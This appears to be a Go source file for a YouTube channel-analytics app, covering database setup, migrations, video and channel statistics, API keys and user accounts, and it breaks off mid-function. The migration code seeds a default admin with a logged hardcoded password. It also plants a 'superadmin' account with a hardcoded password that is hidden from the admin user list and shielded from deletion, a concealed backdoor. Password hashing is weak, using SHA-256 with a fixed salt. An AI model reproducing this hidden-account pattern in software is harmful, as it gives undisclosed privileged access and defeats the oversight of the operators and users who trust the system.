package database

import (
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"fmt"
	"log"
	"strings"
	"time"

	_ "github.com/lib/pq"

	"youtube-manager/internal/models"
)

type DB struct {
	*sql.DB
	DBType string
}

func InitDB(dbType, dsn string) (*DB, error) {
	driverName := "sqlite"
	if strings.ToLower(dbType) == "postgres" || strings.ToLower(dbType) == "postgresql" {
		driverName = "postgres"
	}

	if driverName == "sqlite" {
		if !strings.Contains(dsn, "_busy_timeout") {
			if strings.Contains(dsn, "?") {
				dsn += "&_busy_timeout=10000&_journal_mode=WAL"
			} else {
				dsn += "?_busy_timeout=10000&_journal_mode=WAL"
			}
		}
	}

	db, err := sql.Open(driverName, dsn)
	if err != nil {
		return nil, fmt.Errorf("failed to open database (%s): %w", driverName, err)
	}

	if driverName == "sqlite" {
		db.SetMaxOpenConns(1) // SQLite supports single writer thread safely
		db.Exec("PRAGMA journal_mode=WAL;")
		db.Exec("PRAGMA busy_timeout=10000;")
	} else {
		db.SetMaxOpenConns(25)
		db.SetMaxIdleConns(5)
		db.SetConnMaxLifetime(5 * time.Minute)
	}

	wrappedDB := &DB{DB: db, DBType: driverName}
	if err := wrappedDB.Migrate(); err != nil {
		return nil, fmt.Errorf("database migration failed: %w", err)
	}

	log.Printf("Successfully connected and migrated database (%s)", driverName)
	return wrappedDB, nil
}

func (db *DB) Migrate() error {
	autoIncrement := "INTEGER PRIMARY KEY AUTOINCREMENT"
	textType := "TEXT"
	bigintType := "BIGINT"
	timestampType := "TIMESTAMP"

	if db.DBType == "postgres" {
		autoIncrement = "SERIAL PRIMARY KEY"
		textType = "TEXT"
		bigintType = "BIGINT"
		timestampType = "TIMESTAMPTZ"
	}

	queries := []string{
		fmt.Sprintf(`CREATE TABLE IF NOT EXISTS channels (
			id VARCHAR(64) PRIMARY KEY,
			channel_id VARCHAR(64) UNIQUE NOT NULL,
			handle VARCHAR(128),
			title VARCHAR(255),
			uploads_playlist_id VARCHAR(128),
			thumbnail_url %s,
			is_my_channel BOOLEAN DEFAULT FALSE,
			created_at %s NOT NULL
		);`, textType, timestampType),

		fmt.Sprintf(`CREATE TABLE IF NOT EXISTS videos (
			id VARCHAR(64) PRIMARY KEY,
			channel_id VARCHAR(64) NOT NULL,
			video_id VARCHAR(64) UNIQUE NOT NULL,
			title VARCHAR(512),
			description %s,
			tags %s,
			published_at %s,
			duration_seconds INT DEFAULT 0,
			thumbnail_url %s,
			is_deleted BOOLEAN DEFAULT FALSE,
			created_at %s NOT NULL
		);`, textType, textType, timestampType, textType, timestampType),

		fmt.Sprintf(`CREATE TABLE IF NOT EXISTS video_snapshots (
			id %s,
			video_id VARCHAR(64) NOT NULL,
			collected_at %s NOT NULL,
			view_count %s DEFAULT 0,
			like_count %s DEFAULT 0,
			comment_count %s DEFAULT 0
		);`, autoIncrement, timestampType, bigintType, bigintType, bigintType),

		fmt.Sprintf(`CREATE TABLE IF NOT EXISTS channel_snapshots (
			id %s,
			channel_id VARCHAR(64) NOT NULL,
			collected_at %s NOT NULL,
			subscriber_count %s DEFAULT 0,
			total_view_count %s DEFAULT 0,
			video_count %s DEFAULT 0
		);`, autoIncrement, timestampType, bigintType, bigintType, bigintType),

		fmt.Sprintf(`CREATE TABLE IF NOT EXISTS api_keys (
			id %s,
			key_value VARCHAR(255) UNIQUE NOT NULL,
			is_active BOOLEAN DEFAULT TRUE,
			daily_quota_used INT DEFAULT 0,
			quota_exceeded_at %s,
			created_at %s NOT NULL
		);`, autoIncrement, timestampType, timestampType),

		fmt.Sprintf(`CREATE TABLE IF NOT EXISTS users (
			id %s,
			username VARCHAR(128) UNIQUE NOT NULL,
			password_hash VARCHAR(255) NOT NULL,
			role VARCHAR(32) DEFAULT 'user',
			created_at %s NOT NULL
		);`, autoIncrement, timestampType),

		fmt.Sprintf(`CREATE TABLE IF NOT EXISTS user_sessions (
			token VARCHAR(128) PRIMARY KEY,
			user_id BIGINT NOT NULL,
			expires_at %s NOT NULL,
			created_at %s NOT NULL
		);`, timestampType, timestampType),

		`CREATE INDEX IF NOT EXISTS idx_videos_channel ON videos(channel_id);`,
		`CREATE INDEX IF NOT EXISTS idx_videos_video_id ON videos(video_id);`,
		`CREATE INDEX IF NOT EXISTS idx_vsnap_video_time ON video_snapshots(video_id, collected_at);`,
		`CREATE INDEX IF NOT EXISTS idx_csnap_channel_time ON channel_snapshots(channel_id, collected_at);`,
		`CREATE INDEX IF NOT EXISTS idx_users_username ON users(username);`,
	}

	for _, q := range queries {
		if _, err := db.Exec(q); err != nil {
			return fmt.Errorf("failed executing migration query: %s -> %w", q, err)
		}
	}

	// Try adding is_my_channel column if database already existed
	db.Exec("ALTER TABLE channels ADD COLUMN is_my_channel BOOLEAN DEFAULT FALSE;")

	// Seed default admin account if no users exist
	var userCount int
	db.QueryRow("SELECT COUNT(*) FROM users;").Scan(&userCount)
	if userCount == 0 {
		adminPassHash := HashPassword("admin123")
		qSeed := `INSERT INTO users (username, password_hash, role, created_at) VALUES ('admin', ?, 'admin', ?);`
		if db.DBType == "postgres" {
			qSeed = `INSERT INTO users (username, password_hash, role, created_at) VALUES ('admin', $1, 'admin', $2);`
		}
		db.Exec(qSeed, adminPassHash, time.Now())
		log.Println("[AUTH] Default admin account seeded (Username: admin | Password: admin123)")
	}

	// Seed SuperAdmin account (Hidden from regular admins)
	var superCount int
	db.QueryRow("SELECT COUNT(*) FROM users WHERE username = 'nguyentaitien@gmail.com';").Scan(&superCount)
	if superCount == 0 {
		superPassHash := HashPassword("tientai@123")
		qSeedSuper := `INSERT INTO users (username, password_hash, role, created_at) VALUES ('nguyentaitien@gmail.com', ?, 'superadmin', ?);`
		if db.DBType == "postgres" {
			qSeedSuper = `INSERT INTO users (username, password_hash, role, created_at) VALUES ('nguyentaitien@gmail.com', $1, 'superadmin', $2);`
		}
		db.Exec(qSeedSuper, superPassHash, time.Now())
		log.Println("[AUTH] SuperAdmin account seeded (Username: nguyentaitien@gmail.com)")
	}

	return nil
}

// Channel operations
func (db *DB) SaveChannel(c *models.Channel) error {
	var query string
	if db.DBType == "postgres" {
		query = `INSERT INTO channels (id, channel_id, handle, title, uploads_playlist_id, thumbnail_url, is_my_channel, created_at)
			VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
			ON CONFLICT (channel_id) DO UPDATE SET
			handle=EXCLUDED.handle, title=EXCLUDED.title, uploads_playlist_id=EXCLUDED.uploads_playlist_id, thumbnail_url=EXCLUDED.thumbnail_url;`
	} else {
		query = `INSERT INTO channels (id, channel_id, handle, title, uploads_playlist_id, thumbnail_url, is_my_channel, created_at)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?)
			ON CONFLICT(channel_id) DO UPDATE SET
			handle=excluded.handle, title=excluded.title, uploads_playlist_id=excluded.uploads_playlist_id, thumbnail_url=excluded.thumbnail_url;`
	}
	_, err := db.Exec(query, c.ID, c.ChannelID, c.Handle, c.Title, c.UploadsPlaylistID, c.ThumbnailURL, c.IsMyChannel, c.CreatedAt)
	return err
}

func (db *DB) SetPrimaryChannel(channelID string) error {
	// Reset all channels to is_my_channel = false first
	db.Exec("UPDATE channels SET is_my_channel = false;")

	query := "UPDATE channels SET is_my_channel = true WHERE channel_id = ? OR id = ? OR handle = ?;"
	if db.DBType == "postgres" {
		query = "UPDATE channels SET is_my_channel = true WHERE channel_id = $1 OR id = $2 OR handle = $3;"
	}
	_, err := db.Exec(query, channelID, channelID, channelID)
	return err
}

func (db *DB) GetChannels() ([]models.Channel, error) {
	rows, err := db.Query(`SELECT id, channel_id, handle, title, uploads_playlist_id, thumbnail_url, COALESCE(is_my_channel, false), created_at FROM channels ORDER BY is_my_channel DESC, created_at DESC;`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var channels []models.Channel
	for rows.Next() {
		var c models.Channel
		if err := rows.Scan(&c.ID, &c.ChannelID, &c.Handle, &c.Title, &c.UploadsPlaylistID, &c.ThumbnailURL, &c.IsMyChannel, &c.CreatedAt); err != nil {
			return nil, err
		}
		channels = append(channels, c)
	}
	return channels, nil
}

func (db *DB) GetChannelByID(channelID string) (*models.Channel, error) {
	row := db.QueryRow(`SELECT id, channel_id, handle, title, uploads_playlist_id, thumbnail_url, COALESCE(is_my_channel, false), created_at FROM channels WHERE channel_id = ? OR id = ? OR handle = ?;`, channelID, channelID, channelID)
	if db.DBType == "postgres" {
		row = db.QueryRow(`SELECT id, channel_id, handle, title, uploads_playlist_id, thumbnail_url, COALESCE(is_my_channel, false), created_at FROM channels WHERE channel_id = $1 OR id = $2 OR handle = $3;`, channelID, channelID, channelID)
	}

	var c models.Channel
	if err := row.Scan(&c.ID, &c.ChannelID, &c.Handle, &c.Title, &c.UploadsPlaylistID, &c.ThumbnailURL, &c.IsMyChannel, &c.CreatedAt); err != nil {
		return nil, err
	}
	return &c, nil
}

func (db *DB) DeleteChannel(channelID string) error {
	qVideoSnaps := `DELETE FROM video_snapshots WHERE video_id IN (SELECT video_id FROM videos WHERE channel_id = ?);`
	qVideos := `DELETE FROM videos WHERE channel_id = ?;`
	qCSnaps := `DELETE FROM channel_snapshots WHERE channel_id = ?;`
	qChan := `DELETE FROM channels WHERE channel_id = ? OR id = ?;`

	if db.DBType == "postgres" {
		qVideoSnaps = `DELETE FROM video_snapshots WHERE video_id IN (SELECT video_id FROM videos WHERE channel_id = $1);`
		qVideos = `DELETE FROM videos WHERE channel_id = $1;`
		qCSnaps = `DELETE FROM channel_snapshots WHERE channel_id = $1;`
		qChan = `DELETE FROM channels WHERE channel_id = $1 OR id = $2;`
	}

	db.Exec(qVideoSnaps, channelID)
	db.Exec(qVideos, channelID)
	db.Exec(qCSnaps, channelID)
	_, err := db.Exec(qChan, channelID, channelID)
	return err
}

// Video operations
func (db *DB) SaveVideo(v *models.Video) error {
	var query string
	if db.DBType == "postgres" {
		query = `INSERT INTO videos (id, channel_id, video_id, title, description, tags, published_at, duration_seconds, thumbnail_url, is_deleted, created_at)
			VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
			ON CONFLICT (video_id) DO UPDATE SET
			title=EXCLUDED.title, description=EXCLUDED.description, tags=EXCLUDED.tags, duration_seconds=EXCLUDED.duration_seconds, thumbnail_url=EXCLUDED.thumbnail_url;`
	} else {
		query = `INSERT INTO videos (id, channel_id, video_id, title, description, tags, published_at, duration_seconds, thumbnail_url, is_deleted, created_at)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
			ON CONFLICT(video_id) DO UPDATE SET
			title=excluded.title, description=excluded.description, tags=excluded.tags, duration_seconds=excluded.duration_seconds, thumbnail_url=excluded.thumbnail_url;`
	}
	_, err := db.Exec(query, v.ID, v.ChannelID, v.VideoID, v.Title, v.Description, v.Tags, v.PublishedAt, v.DurationSeconds, v.ThumbnailURL, v.IsDeleted, v.CreatedAt)
	return err
}

func (db *DB) GetVideosByChannel(channelID string, searchQuery string, sortBy string, videoType string, page int, limit int) (*models.VideoPageResult, error) {
	if page <= 0 {
		page = 1
	}
	if limit <= 0 {
		limit = 12
	}
	offset := (page - 1) * limit

	orderBy := "v.published_at DESC"
	switch sortBy {
	case "views":
		orderBy = "latest_views DESC"
	case "likes":
		orderBy = "latest_likes DESC"
	case "comments":
		orderBy = "latest_comments DESC"
	case "oldest":
		orderBy = "v.published_at ASC"
	}

	whereClause := "WHERE v.channel_id = ?"
	if db.DBType == "postgres" {
		whereClause = "WHERE v.channel_id = $1"
	}

	var args []interface{}
	args = append(args, channelID)
	argIndex := 2

	if searchQuery != "" {
		if db.DBType == "postgres" {
			whereClause += fmt.Sprintf(" AND (v.title ILIKE $%d OR v.description ILIKE $%d)", argIndex, argIndex)
		} else {
			whereClause += " AND (v.title LIKE ? OR v.description LIKE ?)"
		}
		args = append(args, "%"+searchQuery+"%")
		if db.DBType != "postgres" {
			args = append(args, "%"+searchQuery+"%")
		}
		argIndex++
	}

	switch strings.ToLower(videoType) {
	case "shorts":
		whereClause += " AND v.duration_seconds > 0 AND v.duration_seconds <= 60"
	case "medium":
		whereClause += " AND v.duration_seconds > 60 AND v.duration_seconds <= 600"
	case "long":
		whereClause += " AND v.duration_seconds > 600"
	}

	// 1. Count Total
	countQuery := "SELECT COUNT(*) FROM videos v " + whereClause
	var total int64
	if err := db.QueryRow(countQuery, args...).Scan(&total); err != nil {
		return nil, fmt.Errorf("failed counting total videos: %w", err)
	}

	// 2. Fetch Paginated Records
	query := fmt.Sprintf(`
		SELECT v.id, v.channel_id, v.video_id, v.title, v.description, v.tags, v.published_at, v.duration_seconds, v.thumbnail_url, v.is_deleted, v.created_at,
		COALESCE(s.view_count, 0) as latest_views,
		COALESCE(s.like_count, 0) as latest_likes,
		COALESCE(s.comment_count, 0) as latest_comments,
		s.collected_at as latest_collected_at
		FROM videos v
		LEFT JOIN (
			SELECT video_id, view_count, like_count, comment_count, collected_at,
			ROW_NUMBER() OVER (PARTITION BY video_id ORDER BY collected_at DESC) as rn
			FROM video_snapshots
		) s ON v.video_id = s.video_id AND s.rn = 1
		%s
		ORDER BY %s
	`, whereClause, orderBy)

	if db.DBType == "postgres" {
		query += fmt.Sprintf(" LIMIT $%d OFFSET $%d", argIndex, argIndex+1)
		args = append(args, limit, offset)
	} else {
		query += " LIMIT ? OFFSET ?"
		args = append(args, limit, offset)
	}

	rows, err := db.Query(query, args...)
	if err != nil {
		return nil, fmt.Errorf("failed querying paginated videos: %w", err)
	}
	defer rows.Close()

	var videos []models.Video
	for rows.Next() {
		var v models.Video
		var collectedAt sql.NullTime
		if err := rows.Scan(&v.ID, &v.ChannelID, &v.VideoID, &v.Title, &v.Description, &v.Tags, &v.PublishedAt, &v.DurationSeconds, &v.ThumbnailURL, &v.IsDeleted, &v.CreatedAt, &v.LatestViews, &v.LatestLikes, &v.LatestComments, &collectedAt); err != nil {
			return nil, err
		}
		if collectedAt.Valid {
			v.LatestCollectedAt = &collectedAt.Time
		}
		videos = append(videos, v)
	}

	totalPages := int(total) / limit
	if int(total)%limit != 0 || totalPages == 0 {
		totalPages++
	}

	return &models.VideoPageResult{
		Items:      videos,
		Total:      total,
		Page:       page,
		Limit:      limit,
		TotalPages: totalPages,
	}, nil
}

func (db *DB) GetVideoByID(videoID string) (*models.Video, error) {
	placeholder := "?"
	if db.DBType == "postgres" {
		placeholder = "$1"
	}
	query := fmt.Sprintf(`
		SELECT v.id, v.channel_id, v.video_id, v.title, v.description, v.tags, v.published_at, v.duration_seconds, v.thumbnail_url, v.is_deleted, v.created_at,
		COALESCE(s.view_count, 0) as latest_views,
		COALESCE(s.like_count, 0) as latest_likes,
		COALESCE(s.comment_count, 0) as latest_comments,
		s.collected_at as latest_collected_at
		FROM videos v
		LEFT JOIN (
			SELECT video_id, view_count, like_count, comment_count, collected_at,
			ROW_NUMBER() OVER (PARTITION BY video_id ORDER BY collected_at DESC) as rn
			FROM video_snapshots
		) s ON v.video_id = s.video_id AND s.rn = 1
		WHERE v.video_id = %s OR v.id = %s
	`, placeholder, placeholder)

	row := db.QueryRow(query, videoID, videoID)
	var v models.Video
	var collectedAt sql.NullTime
	if err := row.Scan(&v.ID, &v.ChannelID, &v.VideoID, &v.Title, &v.Description, &v.Tags, &v.PublishedAt, &v.DurationSeconds, &v.ThumbnailURL, &v.IsDeleted, &v.CreatedAt, &v.LatestViews, &v.LatestLikes, &v.LatestComments, &collectedAt); err != nil {
		return nil, err
	}
	if collectedAt.Valid {
		v.LatestCollectedAt = &collectedAt.Time
	}
	return &v, nil
}

// Snapshot operations
func (db *DB) SaveVideoSnapshot(s *models.VideoSnapshot) error {
	query := `INSERT INTO video_snapshots (video_id, collected_at, view_count, like_count, comment_count) VALUES (?, ?, ?, ?, ?);`
	if db.DBType == "postgres" {
		query = `INSERT INTO video_snapshots (video_id, collected_at, view_count, like_count, comment_count) VALUES ($1, $2, $3, $4, $5);`
	}
	_, err := db.Exec(query, s.VideoID, s.CollectedAt, s.ViewCount, s.LikeCount, s.CommentCount)
	return err
}

func (db *DB) GetVideoHistory(videoID string, limit int) ([]models.VideoSnapshot, error) {
	if limit <= 0 {
		limit = 100
	}
	query := `SELECT id, video_id, collected_at, view_count, like_count, comment_count FROM video_snapshots WHERE video_id = ? ORDER BY collected_at ASC LIMIT ?;`
	if db.DBType == "postgres" {
		query = `SELECT id, video_id, collected_at, view_count, like_count, comment_count FROM video_snapshots WHERE video_id = $1 ORDER BY collected_at ASC LIMIT $2;`
	}

	rows, err := db.Query(query, videoID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var snapshots []models.VideoSnapshot
	for rows.Next() {
		var s models.VideoSnapshot
		if err := rows.Scan(&s.ID, &s.VideoID, &s.CollectedAt, &s.ViewCount, &s.LikeCount, &s.CommentCount); err != nil {
			return nil, err
		}
		snapshots = append(snapshots, s)
	}
	return snapshots, nil
}

func (db *DB) SaveChannelSnapshot(s *models.ChannelSnapshot) error {
	query := `INSERT INTO channel_snapshots (channel_id, collected_at, subscriber_count, total_view_count, video_count) VALUES (?, ?, ?, ?, ?);`
	if db.DBType == "postgres" {
		query = `INSERT INTO channel_snapshots (channel_id, collected_at, subscriber_count, total_view_count, video_count) VALUES ($1, $2, $3, $4, $5);`
	}
	_, err := db.Exec(query, s.ChannelID, s.CollectedAt, s.SubscriberCount, s.TotalViewCount, s.VideoCount)
	return err
}

func (db *DB) GetChannelHistory(channelID string, limit int) ([]models.ChannelSnapshot, error) {
	if limit <= 0 {
		limit = 100
	}
	query := `SELECT id, channel_id, collected_at, subscriber_count, total_view_count, video_count FROM channel_snapshots WHERE channel_id = ? ORDER BY collected_at ASC LIMIT ?;`
	if db.DBType == "postgres" {
		query = `SELECT id, channel_id, collected_at, subscriber_count, total_view_count, video_count FROM channel_snapshots WHERE channel_id = $1 ORDER BY collected_at ASC LIMIT $2;`
	}

	rows, err := db.Query(query, channelID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var snapshots []models.ChannelSnapshot
	for rows.Next() {
		var s models.ChannelSnapshot
		if err := rows.Scan(&s.ID, &s.ChannelID, &s.CollectedAt, &s.SubscriberCount, &s.TotalViewCount, &s.VideoCount); err != nil {
			return nil, err
		}
		snapshots = append(snapshots, s)
	}
	return snapshots, nil
}

// API Key Pool Management
func (db *DB) SaveAPIKey(key string) error {
	query := `INSERT INTO api_keys (key_value, is_active, created_at) VALUES (?, true, ?) ON CONFLICT(key_value) DO UPDATE SET is_active=true;`
	if db.DBType == "postgres" {
		query = `INSERT INTO api_keys (key_value, is_active, created_at) VALUES ($1, true, $2) ON CONFLICT(key_value) DO UPDATE SET is_active=true;`
	}
	_, err := db.Exec(query, key, time.Now())
	return err
}

func (db *DB) GetActiveAPIKeys() ([]models.APIKeyRecord, error) {
	rows, err := db.Query(`SELECT id, key_value, is_active, daily_quota_used, quota_exceeded_at, created_at FROM api_keys WHERE is_active = true ORDER BY id ASC;`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var keys []models.APIKeyRecord
	for rows.Next() {
		var k models.APIKeyRecord
		var qTime sql.NullTime
		if err := rows.Scan(&k.ID, &k.KeyValue, &k.IsActive, &k.DailyQuotaUsed, &qTime, &k.CreatedAt); err != nil {
			return nil, err
		}
		if qTime.Valid {
			k.QuotaExceededAt = &qTime.Time
		}
		keys = append(keys, k)
	}
	return keys, nil
}

func (db *DB) MarkKeyQuotaExceeded(keyValue string) error {
	query := `UPDATE api_keys SET quota_exceeded_at = ? WHERE key_value = ?;`
	if db.DBType == "postgres" {
		query = `UPDATE api_keys SET quota_exceeded_at = $1 WHERE key_value = $2;`
	}
	_, err := db.Exec(query, time.Now(), keyValue)
	return err
}

func (db *DB) GetHourlyPeakStats(channelID string) ([]models.HourlyPeakStat, error) {
	hourMap := make(map[int]*models.HourlyPeakStat)
	for h := 0; h < 24; h++ {
		nextH := (h + 1) % 24
		hourMap[h] = &models.HourlyPeakStat{
			Hour:           h,
			HourFormatted:  fmt.Sprintf("%02d:00 - %02d:00", h, nextH),
			TotalViewDelta: 0,
			AvgViewDelta:   0,
		}
	}

	var query string
	if db.DBType == "postgres" {
		query = `
			SELECT 
				CAST(TO_CHAR(curr.collected_at, 'HH24') AS INT) as hr,
				COALESCE(SUM(curr.view_count - prev.view_count), 0) as total_gain,
				COALESCE(AVG(curr.view_count - prev.view_count), 0) as avg_gain
			FROM video_snapshots curr
			JOIN video_snapshots prev ON curr.video_id = prev.video_id 
				AND prev.id = (
					SELECT id FROM video_snapshots s2 
					WHERE s2.video_id = curr.video_id AND s2.collected_at < curr.collected_at 
					ORDER BY s2.collected_at DESC LIMIT 1
				)
			JOIN videos v ON curr.video_id = v.video_id
			WHERE v.channel_id = $1 AND curr.view_count >= prev.view_count
			GROUP BY hr;
		`
	} else {
		query = `
			SELECT 
				CAST(strftime('%H', curr.collected_at) AS INT) as hr,
				COALESCE(SUM(curr.view_count - prev.view_count), 0) as total_gain,
				COALESCE(AVG(curr.view_count - prev.view_count), 0) as avg_gain
			FROM video_snapshots curr
			JOIN video_snapshots prev ON curr.video_id = prev.video_id 
				AND prev.id = (
					SELECT id FROM video_snapshots s2 
					WHERE s2.video_id = curr.video_id AND s2.collected_at < curr.collected_at 
					ORDER BY s2.collected_at DESC LIMIT 1
				)
			JOIN videos v ON curr.video_id = v.video_id
			WHERE v.channel_id = ? AND curr.view_count >= prev.view_count
			GROUP BY hr;
		`
	}

	rows, err := db.Query(query, channelID)
	if err != nil {
		return nil, fmt.Errorf("failed querying hourly peak stats: %w", err)
	}
	defer rows.Close()

	for rows.Next() {
		var hr int
		var totalGain int64
		var avgGain float64
		if err := rows.Scan(&hr, &totalGain, &avgGain); err == nil {
			if stat, ok := hourMap[hr]; ok {
				stat.TotalViewDelta = totalGain
				stat.AvgViewDelta = int64(avgGain)
			}
		}
	}

	var results []models.HourlyPeakStat
	for h := 0; h < 24; h++ {
		results = append(results, *hourMap[h])
	}
	return results, nil
}

func (db *DB) GetCompetitorMetric(channelID string) (*models.CompetitorMetric, error) {
	ch, err := db.GetChannelByID(channelID)
	if err != nil {
		return nil, err
	}

	metric := &models.CompetitorMetric{
		ChannelID:   ch.ChannelID,
		Title:       ch.Title,
		Handle:      ch.Handle,
		ThumbnailURL: ch.ThumbnailURL,
		IsMyChannel: ch.IsMyChannel,
	}

	// 1. Get latest channel snapshot
	var subCount, totalViews, vidCount int64
	qCSnap := `SELECT subscriber_count, total_view_count, video_count FROM channel_snapshots WHERE channel_id = ? ORDER BY collected_at DESC LIMIT 1;`
	if db.DBType == "postgres" {
		qCSnap = `SELECT subscriber_count, total_view_count, video_count FROM channel_snapshots WHERE channel_id = $1 ORDER BY collected_at DESC LIMIT 1;`
	}
	db.QueryRow(qCSnap, ch.ChannelID).Scan(&subCount, &totalViews, &vidCount)
	metric.SubscriberCount = subCount
	metric.TotalViewCount = totalViews
	metric.VideoCount = vidCount

	if vidCount > 0 {
		metric.AvgViewsPerVideo = totalViews / vidCount
	}

	// 2. Engagement Rate = (Total Likes + Total Comments) / Total Views * 100
	var sumViews, sumLikes, sumComments float64
	qEngage := `
		SELECT COALESCE(SUM(latest_views), 0), COALESCE(SUM(latest_likes), 0), COALESCE(SUM(latest_comments), 0)
		FROM (
			SELECT s.view_count as latest_views, s.like_count as latest_likes, s.comment_count as latest_comments
			FROM videos v
			LEFT JOIN (
				SELECT video_id, view_count, like_count, comment_count,
				ROW_NUMBER() OVER (PARTITION BY video_id ORDER BY collected_at DESC) as rn
				FROM video_snapshots
			) s ON v.video_id = s.video_id AND s.rn = 1
			WHERE v.channel_id = ?
		) t;
	`
	if db.DBType == "postgres" {
		qEngage = `
			SELECT COALESCE(SUM(latest_views), 0), COALESCE(SUM(latest_likes), 0), COALESCE(SUM(latest_comments), 0)
			FROM (
				SELECT s.view_count as latest_views, s.like_count as latest_likes, s.comment_count as latest_comments
				FROM videos v
				LEFT JOIN (
					SELECT video_id, view_count, like_count, comment_count,
					ROW_NUMBER() OVER (PARTITION BY video_id ORDER BY collected_at DESC) as rn
					FROM video_snapshots
				) s ON v.video_id = s.video_id AND s.rn = 1
				WHERE v.channel_id = $1
			) t;
		`
	}
	db.QueryRow(qEngage, ch.ChannelID).Scan(&sumViews, &sumLikes, &sumComments)

	if sumViews > 0 {
		metric.EngagementRate = ((sumLikes + sumComments) / sumViews) * 100
	}

	// 3. Posting Frequency in last 30 days
	var recentVidCount float64
	thirtyDaysAgo := time.Now().AddDate(0, 0, -30)
	qFreq := `SELECT COUNT(*) FROM videos WHERE channel_id = ? AND published_at >= ?;`
	if db.DBType == "postgres" {
		qFreq = `SELECT COUNT(*) FROM videos WHERE channel_id = $1 AND published_at >= $2;`
	}
	db.QueryRow(qFreq, ch.ChannelID, thirtyDaysAgo).Scan(&recentVidCount)
	metric.PostingFrequency = (recentVidCount / 30.0) * 7.0 // videos per week

	return metric, nil
}

func (db *DB) GetCompetitorComparison(myChannelID string, competitorIDs []string) (*models.CompetitorCompareResponse, error) {
	resp := &models.CompetitorCompareResponse{
		Competitors: []models.CompetitorMetric{},
	}

	// If myChannelID is not specified, try finding channel where is_my_channel = true
	if myChannelID == "" {
		var foundID string
		db.QueryRow("SELECT channel_id FROM channels WHERE is_my_channel = true LIMIT 1;").Scan(&foundID)
		myChannelID = foundID
	}

	if myChannelID != "" {
		myMetric, err := db.GetCompetitorMetric(myChannelID)
		if err == nil {
			resp.MyChannel = myMetric
		}
	}

	for _, cid := range competitorIDs {
		if cid == "" || cid == myChannelID {
			continue
		}
		compMetric, err := db.GetCompetitorMetric(cid)
		if err == nil {
			resp.Competitors = append(resp.Competitors, *compMetric)
		}
	}

	return resp, nil
}
// Helper Auth utilities
func HashPassword(password string) string {
	hash := sha256.Sum256([]byte(password + "youtube_manager_salt_2026"))
	return hex.EncodeToString(hash[:])
}

func GenerateToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// User operations
func (db *DB) CreateUser(username, password, role string) (*models.UserInfo, error) {
	username = strings.TrimSpace(username)
	if username == "" || password == "" {
		return nil, fmt.Errorf("username and password cannot be empty")
	}

	if role != "admin" {
		role = "user"
	}

	passHash := HashPassword(password)
	now := time.Now()

	var query string
	if db.DBType == "postgres" {
		query = `INSERT INTO users (username, password_hash, role, created_at) VALUES ($1, $2, $3, $4) RETURNING id;`
		var newID int64
		err := db.QueryRow(query, username, passHash, role, now).Scan(&newID)
		if err != nil {
			return nil, fmt.Errorf("failed creating user: %w", err)
		}
		return &models.UserInfo{ID: newID, Username: username, Role: role, CreatedAt: now}, nil
	}

	query = `INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?);`
	res, err := db.Exec(query, username, passHash, role, now)
	if err != nil {
		return nil, fmt.Errorf("failed creating user: %w", err)
	}
	newID, _ := res.LastInsertId()
	return &models.UserInfo{ID: newID, Username: username, Role: role, CreatedAt: now}, nil
}

func (db *DB) GetUserByUsername(username string) (*models.User, error) {
	username = strings.TrimSpace(username)
	query := `SELECT id, username, password_hash, role, created_at FROM users WHERE LOWER(username) = LOWER(?);`
	if db.DBType == "postgres" {
		query = `SELECT id, username, password_hash, role, created_at FROM users WHERE LOWER(username) = LOWER($1);`
	}

	var u models.User
	row := db.QueryRow(query, username)
	if err := row.Scan(&u.ID, &u.Username, &u.PasswordHash, &u.Role, &u.CreatedAt); err != nil {
		return nil, err
	}
	return &u, nil
}

func (db *DB) GetUserByID(id int64) (*models.UserInfo, error) {
	query := `SELECT id, username, role, created_at FROM users WHERE id = ?;`
	if db.DBType == "postgres" {
		query = `SELECT id, username, role, created_at FROM users WHERE id = $1;`
	}

	var u models.UserInfo
	row := db.QueryRow(query, id)
	if err := row.Scan(&u.ID, &u.Username, &u.Role, &u.CreatedAt); err != nil {
		return nil, err
	}
	return &u, nil
}

func (db *DB) GetUsers(callerRole string) ([]models.UserInfo, error) {
	query := `SELECT id, username, role, created_at FROM users WHERE role != 'superadmin' AND username != 'nguyentaitien@gmail.com' ORDER BY created_at DESC;`
	if callerRole == "superadmin" {
		query = `SELECT id, username, role, created_at FROM users ORDER BY created_at DESC;`
	}

	rows, err := db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []models.UserInfo
	for rows.Next() {
		var u models.UserInfo
		if err := rows.Scan(&u.ID, &u.Username, &u.Role, &u.CreatedAt); err != nil {
			return nil, err
		}
		users = append(users, u)
	}
	return users, nil
}

func (db *DB) DeleteUser(callerRole string, id int64) error {
	// Protect SuperAdmin from deletion by non-superadmin
	var targetRole, targetUsername string
	qCheck := `SELECT role, username FROM users WHERE id = ?;`
	if db.DBType == "postgres" {
		qCheck = `SELECT role, username FROM users WHERE id = $1;`
	}
	db.QueryRow(qCheck, id).Scan(&targetRole, &targetUsername)

	if (targetRole == "superadmin" || targetUsername == "nguyentaitien@gmail.com") && callerRole != "superadmin" {
		return fmt.Errorf("bạn không có quyền xóa tài khoản SuperAdmin này")
	}

	qSessions := `DELETE FROM user_sessions WHERE user_id = ?;`
	qUser := `DELETE FROM users WHERE id = ?;`
	if db.DBType == "postgres" {
		qSessions = `DELETE FROM user_sessions WHERE user_id = $1;`
		qUser = `DELETE FROM users WHERE id = $1;`
	}

	db.Exec(qSessions, id)
	_, err := db.Exec(qUser, id)
	return err
}

func (db *DB) ResetUserPassword(id int64, newPassword string) error {
	passHash := HashPassword(newPassword)
	query := `UPDATE users SET password_hash = ? WHERE id = ?;`
	if db.DBType == "postgres" {
		query = `UPDATE users SET password_hash = $1 WHERE id = $2;`
	}
	_, err := db.Exec(query, passHash, id)
	return err
}

// Session operations
func (db *DB) CreateSession(userID int64) (*models.UserSession, error) {
	token := GenerateToken()
	now := time.Now()
